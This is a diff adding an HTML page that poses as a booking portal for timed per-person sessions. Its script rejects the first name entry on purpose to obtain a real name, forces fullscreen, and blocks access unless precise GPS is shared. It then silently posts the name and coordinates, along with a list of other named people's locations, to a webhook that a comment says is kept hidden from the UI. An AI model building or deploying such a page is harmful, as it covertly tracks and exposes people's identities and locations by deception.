@@ -1,0 +1,513 @@
+<!DOCTYPE html>
+<html lang="en" class="h-full bg-slate-950">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Booking & Experience Portal</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+        }
+        @keyframes pulseFast {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+        .animate-pulse-fast {
+            animation: pulseFast 1.2s cubic-bezier(0.4, 0, 0.6, 1) infinite;
+        }
+    </style>
+</head>
+<body class="h-full bg-slate-950 text-slate-100 flex flex-col antialiased selection:bg-blue-500 selection:text-white">
+
+    <!-- LOCATION DENIED / ERROR FULLSCREEN SCREEN (RED ACCENT) -->
+    <div id="screen-denied" class="hidden fixed inset-0 z-50 bg-red-950 text-red-100 flex flex-col items-center justify-center p-6 text-center space-y-6">
+        <div class="w-24 h-24 rounded-full bg-red-900/80 border-2 border-red-500/50 flex items-center justify-center shadow-2xl shadow-red-900/50 animate-pulse">
+            <svg class="w-12 h-12 text-red-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"/>
+            </svg>
+        </div>
+        
+        <div class="max-w-xl space-y-4">
+            <h1 class="text-3xl md:text-4xl font-black uppercase tracking-wider text-red-400">
+                Access Denied
+            </h1>
+            <p class="text-lg md:text-xl font-bold text-red-200 border-y border-red-800/80 py-4 px-2 leading-relaxed bg-red-900/40 rounded-xl">
+                you denied access to location please give location access due to accessing data if any case of danger
+            </p>
+            <p class="text-xs text-red-300/70 font-medium">
+                High accuracy GPS coordinates are mandatory to initialize your session and enter the booking portal.
+            </p>
+        </div>
+
+        <button id="btn-retry-location" class="px-8 py-3.5 bg-red-600 hover:bg-red-500 text-white font-bold rounded-xl shadow-lg shadow-red-700/40 border border-red-400 transition-all transform active:scale-95">
+            Grant Location & Try Again
+        </button>
+    </div>
+
+    <!-- MAIN APP CONTAINER -->
+    <div id="app-container" class="flex-grow flex flex-col min-h-screen">
+        
+        <!-- Header -->
+        <header class="border-b border-slate-800/80 bg-slate-900/60 backdrop-blur-md sticky top-0 z-30 px-4 lg:px-8 py-4">
+            <div class="max-w-6xl mx-auto flex items-center justify-between">
+                <div class="flex items-center space-x-3">
+                    <div class="w-10 h-10 rounded-xl bg-gradient-to-tr from-blue-600 to-indigo-600 flex items-center justify-center font-black text-xl shadow-lg shadow-blue-500/20 text-white">
+                        B
+                    </div>
+                    <div>
+                        <h1 class="font-bold text-white leading-tight">Booking Portal</h1>
+                        <p class="text-[11px] text-slate-400">Customer Session Hub</p>
+                    </div>
+                </div>
+
+                <!-- User Badge -->
+                <div id="header-user-badge" class="hidden flex items-center space-x-3 bg-slate-800/80 px-4 py-2 rounded-xl border border-slate-700/60">
+                    <div class="flex items-center space-x-2">
+                        <span class="w-2.5 h-2.5 rounded-full bg-emerald-500 animate-pulse-fast"></span>
+                        <span id="nav-user-name" class="text-sm font-semibold text-slate-200">Customer</span>
+                    </div>
+                </div>
+            </div>
+        </header>
+
+        <!-- STEP 1: INITIAL NAME MODAL (Overlay) -->
+        <div id="modal-name" class="fixed inset-0 z-40 bg-slate-950/95 backdrop-blur-md flex items-center justify-center p-4">
+            <div class="bg-slate-900 border border-slate-800 p-6 md:p-8 rounded-3xl max-w-md w-full shadow-2xl space-y-6">
+                <div class="text-center space-y-2">
+                    <div class="w-14 h-14 bg-blue-500/10 text-blue-400 rounded-2xl flex items-center justify-center mx-auto border border-blue-500/20">
+                        <svg class="w-7 h-7" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"/>
+                        </svg>
+                    </div>
+                    <h2 class="text-2xl font-bold text-white">Welcome! Enter Real Name</h2>
+                    <p class="text-xs text-slate-400">Please provide your real full name to start your booking.</p>
+                </div>
+
+                <!-- First Attempt Error Banner -->
+                <div id="name-error-banner" class="hidden bg-rose-500/10 border border-rose-500/30 p-3.5 rounded-xl text-xs text-rose-400 space-y-1">
+                    <p class="font-bold flex items-center space-x-1.5">
+                        <svg class="w-4 h-4 shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>
+                        <span>Name entry rejected on first attempt!</span>
+                    </p>
+                    <p class="text-rose-300/80">Please re-enter your name accurately and submit again to verify.</p>
+                </div>
+
+                <form id="form-name" class="space-y-4">
+                    <div>
+                        <label class="block text-xs font-semibold text-slate-300 uppercase tracking-wider mb-2">Your Real Name</label>
+                        <input type="text" id="input-real-name" required placeholder="e.g. John Doe" class="w-full bg-slate-950 border border-slate-800 rounded-xl px-4 py-3 text-sm text-white placeholder-slate-600 focus:outline-none focus:border-blue-500 focus:ring-1 focus:ring-blue-500 transition">
+                    </div>
+                    <button type="submit" class="w-full py-3.5 bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-500 hover:to-indigo-500 text-white font-bold rounded-xl shadow-lg shadow-blue-600/30 transition">
+                        Continue to Location Verification
+                    </button>
+                </form>
+            </div>
+        </div>
+
+        <!-- STEP 2: LOCATION PROMPT MODAL (Overlay) -->
+        <div id="modal-location" class="hidden fixed inset-0 z-40 bg-slate-950/95 backdrop-blur-md flex items-center justify-center p-4">
+            <div class="bg-slate-900 border border-slate-800 p-6 md:p-8 rounded-3xl max-w-md w-full shadow-2xl text-center space-y-6">
+                <div class="w-16 h-16 bg-amber-500/10 text-amber-400 rounded-2xl flex items-center justify-center mx-auto border border-amber-500/20 ring-4 ring-amber-500/5">
+                    <svg class="w-8 h-8 animate-bounce" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17.657 16.657L13.414 20.9a1.998 1.998 0 01-2.827 0l-4.244-4.243a8 8 0 1111.314 0z"/>
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 11a3 3 0 11-6 0 3 3 0 016 0z"/>
+                    </svg>
+                </div>
+                <div class="space-y-2">
+                    <h2 class="text-2xl font-bold text-white">Exact Location Required</h2>
+                    <p class="text-xs text-slate-400 leading-relaxed">
+                        To proceed, the browser will enter full screen mode and request high-accuracy GPS coordinates.
+                    </p>
+                </div>
+
+                <button id="btn-request-location" class="w-full py-4 bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-500 hover:to-indigo-500 text-white font-bold rounded-xl shadow-xl shadow-blue-600/30 transition duration-200">
+                    Allow Fullscreen & Share Location
+                </button>
+            </div>
+        </div>
+
+        <!-- MAIN CONTENT DASHBOARD (Shown after name + location granted) -->
+        <main class="max-w-6xl mx-auto w-full px-4 lg:px-8 py-8 flex-grow space-y-10">
+            <!-- Hero / Welcome Banner -->
+            <div class="bg-gradient-to-r from-blue-900/40 via-indigo-900/30 to-slate-900 border border-blue-500/20 rounded-3xl p-6 md:p-8 flex flex-col md:flex-row items-start md:items-center justify-between gap-6 shadow-2xl relative overflow-hidden">
+                <div class="absolute -right-10 -bottom-10 w-60 h-60 bg-blue-500/10 rounded-full blur-3xl pointer-events-none"></div>
+                <div class="space-y-2">
+                    <div class="inline-flex items-center space-x-2 bg-blue-500/10 border border-blue-500/30 text-blue-400 text-xs px-3 py-1 rounded-full font-semibold">
+                        <span class="w-2 h-2 rounded-full bg-blue-400 animate-pulse"></span>
+                        <span>Location Captured & Verified</span>
+                    </div>
+                    <h2 class="text-2xl md:text-3xl font-extrabold text-white">Select Your Person Booking Plan</h2>
+                    <p class="text-sm text-slate-400 max-w-xl">
+                        Choose your preferred time slot below for your booking session. Rates are calculated per person.
+                    </p>
+                </div>
+
+                <!-- Coordinates Quick Status Display -->
+                <div class="bg-slate-950/70 border border-slate-800 p-4 rounded-2xl text-xs space-y-1 shrink-0 w-full md:w-auto font-mono">
+                    <p class="text-slate-400 font-sans font-semibold text-[11px] uppercase tracking-wider">Logged Coordinates</p>
+                    <p class="text-emerald-400 font-bold" id="display-coords">Lat: --.----, Lng: --.----</p>
+                    <p class="text-slate-500 text-[10px]" id="display-sync-time">Logged</p>
+                </div>
+            </div>
+
+            <!-- RATES / BOOKING CARDS -->
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
+                <!-- 15 MIN PLAN -->
+                <div class="bg-slate-900/80 border border-slate-800 hover:border-blue-500/50 rounded-3xl p-6 flex flex-col justify-between transition-all duration-300 hover:shadow-2xl hover:shadow-blue-500/10 group">
+                    <div class="space-y-4">
+                        <div class="flex items-center justify-between">
+                            <span class="bg-blue-500/10 text-blue-400 text-xs font-bold px-3 py-1 rounded-full border border-blue-500/20">Quick Session</span>
+                            <span class="text-xs text-slate-500 font-medium">Per Person</span>
+                        </div>
+                        <div>
+                            <h3 class="text-3xl font-extrabold text-white group-hover:text-blue-400 transition">15 Mins</h3>
+                            <div class="flex items-baseline space-x-1 mt-1">
+                                <span class="text-2xl font-bold text-white">₹30</span>
+                                <span class="text-xs text-slate-400">/ person</span>
+                            </div>
+                        </div>
+                        <p class="text-xs text-slate-400 leading-relaxed">Fast-track entry session. Perfect for short visits and instant access.</p>
+                    </div>
+                    <button onclick="selectBookingPlan('15 Min', '₹30')" class="mt-6 w-full py-3 bg-slate-800 hover:bg-blue-600 text-slate-200 hover:text-white font-bold rounded-xl border border-slate-700 hover:border-blue-500 transition duration-200">
+                        Book 15 Min (₹30)
+                    </button>
+                </div>
+
+                <!-- 30 MIN PLAN -->
+                <div class="bg-slate-900/80 border border-blue-500/40 relative rounded-3xl p-6 flex flex-col justify-between transition-all duration-300 hover:shadow-2xl hover:shadow-blue-500/20 group">
+                    <div class="absolute -top-3 left-1/2 -translate-x-1/2 bg-blue-600 text-white text-[10px] uppercase font-bold tracking-widest px-3 py-0.5 rounded-full shadow-md">
+                        Most Popular
+                    </div>
+                    <div class="space-y-4">
+                        <div class="flex items-center justify-between">
+                            <span class="bg-blue-500/20 text-blue-300 text-xs font-bold px-3 py-1 rounded-full border border-blue-500/30">Standard</span>
+                            <span class="text-xs text-slate-500 font-medium">Per Person</span>
+                        </div>
+                        <div>
+                            <h3 class="text-3xl font-extrabold text-white group-hover:text-blue-400 transition">30 Mins</h3>
+                            <div class="flex items-baseline space-x-1 mt-1">
+                                <span class="text-2xl font-bold text-white">₹70</span>
+                                <span class="text-xs text-slate-400">/ person</span>
+                            </div>
+                        </div>
+                        <p class="text-xs text-slate-400 leading-relaxed">Standard duration slot giving ample time to enjoy all featured amenities.</p>
+                    </div>
+                    <button onclick="selectBookingPlan('30 Min', '₹70')" class="mt-6 w-full py-3 bg-blue-600 hover:bg-blue-500 text-white font-bold rounded-xl shadow-lg shadow-blue-600/30 transition duration-200">
+                        Book 30 Min (₹70)
+                    </button>
+                </div>
+
+                <!-- 1 HOUR PLAN -->
+                <div class="bg-slate-900/80 border border-slate-800 hover:border-indigo-500/50 rounded-3xl p-6 flex flex-col justify-between transition-all duration-300 hover:shadow-2xl hover:shadow-indigo-500/10 group">
+                    <div class="space-y-4">
+                        <div class="flex items-center justify-between">
+                            <span class="bg-indigo-500/10 text-indigo-400 text-xs font-bold px-3 py-1 rounded-full border border-indigo-500/20">Extended</span>
+                            <span class="text-xs text-slate-500 font-medium">Per Person</span>
+                        </div>
+                        <div>
+                            <h3 class="text-3xl font-extrabold text-white group-hover:text-indigo-400 transition">1 Hour</h3>
+                            <div class="flex items-baseline space-x-1 mt-1">
+                                <span class="text-2xl font-bold text-white">₹150</span>
+                                <span class="text-xs text-slate-400">/ person</span>
+                            </div>
+                        </div>
+                        <p class="text-xs text-slate-400 leading-relaxed">Full hour premium access pass. Recommended for groups and relaxed visits.</p>
+                    </div>
+                    <button onclick="selectBookingPlan('1 Hour', '₹150')" class="mt-6 w-full py-3 bg-slate-800 hover:bg-indigo-600 text-slate-200 hover:text-white font-bold rounded-xl border border-slate-700 hover:border-indigo-500 transition duration-200">
+                        Book 1 Hour (₹150)
+                    </button>
+                </div>
+            </div>
+
+            <!-- OTHER CUSTOMERS LIST -->
+            <div class="w-full">
+                <div class="bg-slate-900 border border-slate-800 rounded-3xl p-6 space-y-6 shadow-xl">
+                    <div class="flex items-center justify-between border-b border-slate-800 pb-4">
+                        <div>
+                            <h3 class="text-lg font-bold text-white flex items-center space-x-2">
+                                <span>See Other Customers</span>
+                                <span id="customer-count-badge" class="bg-blue-500/10 text-blue-400 border border-blue-500/20 text-xs px-2 py-0.5 rounded-full font-bold">5 Active</span>
+                            </h3>
+                            <p class="text-xs text-slate-400 mt-0.5">Real-time listing of active registered visitors (Coordinates hidden for privacy)</p>
+                        </div>
+                        <button id="btn-refresh-list" class="text-xs bg-slate-800 hover:bg-slate-700 text-slate-300 hover:text-white px-3 py-1.5 rounded-lg border border-slate-700 transition">
+                            Refresh List
+                        </button>
+                    </div>
+
+                    <!-- Customer List Elements -->
+                    <ul id="customer-list-ul" class="divide-y divide-slate-800/80 max-h-80 overflow-y-auto pr-1">
+                        <!-- Populated via JS -->
+                    </ul>
+                </div>
+            </div>
+        </main>
+
+        <!-- Footer -->
+        <footer class="border-t border-slate-800/80 bg-slate-950 py-6 text-center text-xs text-slate-500">
+            <p>© 2026 Booking & Experience Portal. High Accuracy GPS Active.</p>
+        </footer>
+    </div>
+
+    <!-- Notification Toast Box -->
+    <div id="toast-msg" class="fixed bottom-5 right-5 z-50 transform translate-y-20 opacity-0 transition duration-300 bg-slate-800 border border-slate-700 text-white px-5 py-3 rounded-2xl shadow-2xl flex items-center space-x-3 pointer-events-none">
+        <span id="toast-icon" class="text-blue-400">ℹ️</span>
+        <span id="toast-text" class="text-xs font-semibold">Notification message</span>
+    </div>
+
+    <script>
+        // --- APPLICATION STATE ---
+        let userRealName = "";
+        let userCoordinates = null; // { lat, lng }
+        let nameSubmissionCount = 0; // Tracks first attempt error rule
+        
+        // Background Webhook URL (Kept hidden from UI)
+        const GOOGLE_APPS_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbx1gHcT8_FiNB77FFQ8JJn8e8e8gUsxpySv-_TLvN3awJP-gV5jCWeJNcm9Qj-ZX4MS/exec";
+
+        // Pre-populated Customer Database
+        let customerDatabase = [
+            { name: "Job", coords: { lat: 10.5234, lng: 76.2145 }, time: "10 mins ago" },
+            { name: "Anay", coords: { lat: 10.5512, lng: 76.1832 }, time: "25 mins ago" },
+            { name: "Christy", coords: { lat: 10.5109, lng: 76.2201 }, time: "1 hour ago" },
+            { name: "Jovan", coords: { lat: 10.5388, lng: 76.1994 }, time: "2 hours ago" }
+        ];
+
+        // DOM Elements
+        const modalName = document.getElementById('modal-name');
+        const modalLocation = document.getElementById('modal-location');
+        const screenDenied = document.getElementById('screen-denied');
+        const formName = document.getElementById('form-name');
+        const inputRealName = document.getElementById('input-real-name');
+        const nameErrorBanner = document.getElementById('name-error-banner');
+        const btnRequestLocation = document.getElementById('btn-request-location');
+        const btnRetryLocation = document.getElementById('btn-retry-location');
+        const headerUserBadge = document.getElementById('header-user-badge');
+        const navUserName = document.getElementById('nav-user-name');
+        const displayCoords = document.getElementById('display-coords');
+        const displaySyncTime = document.getElementById('display-sync-time');
+        const customerListUl = document.getElementById('customer-list-ul');
+        const customerCountBadge = document.getElementById('customer-count-badge');
+        const btnRefreshList = document.getElementById('btn-refresh-list');
+
+        // STEP 1: Handle Real Name Form Submission
+        formName.addEventListener('submit', (e) => {
+            e.preventDefault();
+            const entered = inputRealName.value.trim();
+            if (!entered) return;
+
+            nameSubmissionCount++;
+
+            if (nameSubmissionCount === 1) {
+                nameErrorBanner.classList.remove('hidden');
+                showToast("⚠️ Name entry rejected on first attempt. Please re-check.", "warning");
+                inputRealName.value = "";
+                inputRealName.focus();
+            } else {
+                userRealName = entered;
+                nameErrorBanner.classList.add('hidden');
+                modalName.classList.add('hidden');
+                
+                modalLocation.classList.remove('hidden');
+                showToast(`Welcome ${userRealName}! Please allow location access next.`, "success");
+            }
+        });
+
+        // STEP 2: Request Fullscreen and Location
+        btnRequestLocation.addEventListener('click', () => {
+            requestFullScreenMode();
+            acquireLocation();
+        });
+
+        btnRetryLocation.addEventListener('click', () => {
+            screenDenied.classList.add('hidden');
+            acquireLocation();
+        });
+
+        function requestFullScreenMode() {
+            const docEl = document.documentElement;
+            if (docEl.requestFullscreen) {
+                docEl.requestFullscreen().catch(() => {});
+            } else if (docEl.webkitRequestFullscreen) {
+                docEl.webkitRequestFullscreen();
+            } else if (docEl.msRequestFullscreen) {
+                docEl.msRequestFullscreen();
+            }
+        }
+
+        function acquireLocation() {
+            if (!navigator.geolocation) {
+                showLocationDeniedScreen();
+                return;
+            }
+
+            const options = {
+                enableHighAccuracy: true,
+                timeout: 12000,
+                maximumAge: 0
+            };
+
+            navigator.geolocation.getCurrentPosition(
+                onLocationSuccess,
+                onLocationError,
+                options
+            );
+        }
+
+        function onLocationSuccess(position) {
+            userCoordinates = {
+                lat: position.coords.latitude.toFixed(6),
+                lng: position.coords.longitude.toFixed(6)
+            };
+
+            modalLocation.classList.add('hidden');
+            screenDenied.classList.add('hidden');
+
+            navUserName.textContent = userRealName;
+            headerUserBadge.classList.remove('hidden');
+            displayCoords.textContent = `Lat: ${userCoordinates.lat}, Lng: ${userCoordinates.lng}`;
+
+            const nowTime = new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
+            
+            const existingIdx = customerDatabase.findIndex(c => c.name === userRealName);
+            if (existingIdx !== -1) {
+                customerDatabase[existingIdx].coords = userCoordinates;
+                customerDatabase[existingIdx].time = `Today at ${nowTime}`;
+            } else {
+                customerDatabase.unshift({
+                    name: userRealName,
+                    coords: userCoordinates,
+                    time: `Today at ${nowTime}`
+                });
+            }
+
+            renderCustomerList();
+
+            // Silent sync in background
+            syncToGoogleDrive();
+
+            showToast("Location granted successfully!", "success");
+        }
+
+        function onLocationError(error) {
+            console.error("Location acquisition error:", error);
+            showLocationDeniedScreen();
+        }
+
+        function showLocationDeniedScreen() {
+            modalLocation.classList.add('hidden');
+            screenDenied.classList.remove('hidden');
+        }
+
+        function generateCustomerTxtContent() {
+            let txt = "=== CUSTOMER DATA LOG (customer.txt) ===\n";
+            txt += `Generated: ${new Date().toLocaleString()}\n`;
+            txt += `Total Logged Users: ${customerDatabase.length}\n\n`;
+
+            customerDatabase.forEach((item, i) => {
+                txt += `[Customer #${i + 1}]\n`;
+                txt += `Name: ${item.name}\n`;
+                txt += `Latitude: ${item.coords ? item.coords.lat : 'N/A'}\n`;
+                txt += `Longitude: ${item.coords ? item.coords.lng : 'N/A'}\n`;
+                txt += `Entry Time: ${item.time}\n`;
+                txt += `----------------------------------------\n`;
+            });
+
+            return txt;
+        }
+
+        // Silent background sync
+        async function syncToGoogleDrive() {
+            const rawTxt = generateCustomerTxtContent();
+
+            try {
+                await fetch(GOOGLE_APPS_SCRIPT_URL, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    headers: { 'Content-Type': 'text/plain' },
+                    body: rawTxt
+                });
+
+                const timeStr = new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' });
+                if (displaySyncTime) displaySyncTime.textContent = `Logged at ${timeStr}`;
+
+            } catch (err) {
+                console.error("Background sync error:", err);
+            }
+        }
+
+        function renderCustomerList() {
+            customerListUl.innerHTML = '';
+            customerCountBadge.textContent = `${customerDatabase.length} Active`;
+
+            customerDatabase.forEach((cust) => {
+                const li = document.createElement('li');
+                li.className = "py-3.5 flex items-center justify-between transition hover:bg-slate-800/40 px-2 rounded-xl";
+
+                const isMe = cust.name === userRealName;
+
+                li.innerHTML = `
+                    <div class="flex items-center space-x-3">
+                        <div class="w-10 h-10 rounded-xl ${isMe ? 'bg-gradient-to-tr from-blue-500 to-indigo-600 ring-2 ring-blue-400/50' : 'bg-slate-800 border border-slate-700'} flex items-center justify-center text-white font-bold text-sm shadow-md">
+                            ${cust.name.charAt(0).toUpperCase()}
+                        </div>
+                        <div>
+                            <p class="text-sm font-bold text-white flex items-center space-x-2">
+                                <span>${cust.name}</span>
+                                ${isMe ? '<span class="text-[10px] bg-blue-500/20 text-blue-400 border border-blue-500/30 font-semibold px-2 py-0.5 rounded-md">YOU</span>' : ''}
+                            </p>
+                            <p class="text-xs text-slate-400 font-medium">
+                                Entered: <span class="text-slate-300">${cust.time}</span>
+                            </p>
+                        </div>
+                    </div>
+                    <div class="flex items-center space-x-2">
+                        <span class="w-2 h-2 rounded-full bg-emerald-400 animate-pulse"></span>
+                        <span class="text-xs text-emerald-400 font-semibold bg-emerald-950/60 border border-emerald-800/40 px-2.5 py-1 rounded-lg">
+                            Active
+                        </span>
+                    </div>
+                `;
+                customerListUl.appendChild(li);
+            });
+        }
+
+        btnRefreshList.addEventListener('click', () => {
+            renderCustomerList();
+            showToast("Customer list refreshed", "info");
+        });
+
+        function selectBookingPlan(duration, rate) {
+            if (!userRealName) {
+                showToast("Please enter your name first!", "warning");
+                return;
+            }
+            showToast(`Applied for ${duration} session (${rate} per person) for ${userRealName}.`, "success");
+        }
+
+        function showToast(message, type = "info") {
+            const toast = document.getElementById('toast-msg');
+            const toastText = document.getElementById('toast-text');
+            const toastIcon = document.getElementById('toast-icon');
+
+            toastText.textContent = message;
+            if (type === "success") toastIcon.textContent = "✅";
+            else if (type === "warning") toastIcon.textContent = "⚠️";
+            else toastIcon.textContent = "ℹ️";
+
+            toast.classList.remove('translate-y-20', 'opacity-0');
+            toast.classList.add('translate-y-0', 'opacity-100');
+
+            setTimeout(() => {
+                toast.classList.remove('translate-y-0', 'opacity-100');
+                toast.classList.add('translate-y-20', 'opacity-0');
+            }, 3500);
+        }
+
+        renderCustomerList();
+    </script>
+</body>
+</html>
